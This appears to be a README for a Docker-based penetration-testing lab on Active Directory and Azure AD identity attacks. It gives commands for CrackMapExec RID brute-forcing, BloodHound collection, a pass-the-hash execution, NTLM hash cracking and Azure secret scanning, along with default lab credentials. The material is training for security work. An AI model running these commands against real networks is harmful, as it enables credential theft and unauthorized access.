# Unit 4 - Hacking de Identidad y AD Moderno

## Objectives

1. Understand modern Active Directory attacks
2. Learn Azure AD vulnerability assessment
3. Master identity theft techniques
4. Understand modern authentication protocols
5. Learn to secure identity systems

## Tools Included

- **Kali Linux**: Penetration testing distribution
- **Impacket**: AD attack tools
- **BloodHound**: AD mapping and analysis
- **CrackMapExec**: AD enumeration tool
- **PowerView**: AD PowerShell module

## Lab Setup

### Build and Start Containers

```bash
cd docker-labs/unit4
docker-compose up -d
```

### Access the Lab

1. **Web Interface**: http://localhost:8083 (Kali Desktop via noVNC)
2. **SSH Access**:
   ```bash
   ssh root@localhost -p 2225
   Password: toor
   ```

### Stop and Cleanup

```bash
cd docker-labs/unit4
docker-compose down

# Remove volumes (deletes all data)
docker-compose down -v
```

## Lab Exercises

### Exercise 1: AD Enumeration with CrackMapExec

1. Enumerate domain controllers:
   ```bash
   crackmapexec smb 192.168.0.104 -u 'guest' -p '' --rid-brute
   ```

2. Enumerate users and groups:
   ```bash
   crackmapexec smb 192.168.0.104 -u 'admin' -p 'password123' --users --groups
   ```

### Exercise 2: BloodHound AD Analysis

1. Run SharpHound to collect data:
   ```bash
   Invoke-BloodHound -CollectionMethod All -Domain testlab.local -ZipFileName lab-data.zip
   ```

2. Analyze with BloodHound:
   ```bash
   neo4j start
   bloodhound --no-sandbox
   ```

### Exercise 3: Pass-the-Hash Attacks

1. Perform pass-the-hash:
   ```bash
   pth-winexe -U 'DOMAIN/USER%NTLMHASH' //192.168.0.104 "cmd.exe /c ipconfig"
   ```

2. Crack password hashes:
   ```bash
   hashcat -m 1000 -a 0 ntlm-hashes.txt /usr/share/wordlists/rockyou.txt
   ```

### Exercise 4: Azure AD Testing

1. Enumerate Azure AD users:
   ```bash
   python3 azure_ad_enum.py -t <tenant-id> -k <api-key> --users
   ```

2. Find exposed secrets in Azure:
   ```bash
   python3 azure_secret_scanner.py -t <tenant-id> -k <api-key> --scan
   ```

## Resources

- [BloodHound Documentation](https://github.com/BloodHoundAD/BloodHound)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [Impacket Documentation](https://github.com/SecureAuthCorp/impacket)
- [Azure AD Security Best Practices](https://docs.microsoft.com/en-us/azure/active-directory/security/overview)

## Troubleshooting

### Cannot connect to domain controller

Check network connectivity:
```bash
cd docker-labs/unit4
docker exec -it kali ping 192.168.0.104
```

### BloodHound won't start

Check Neo4j status:
```bash
cd docker-labs/unit4
docker exec -it kali neo4j status
```

Restart Neo4j:
```bash
docker exec -it kali neo4j start
```
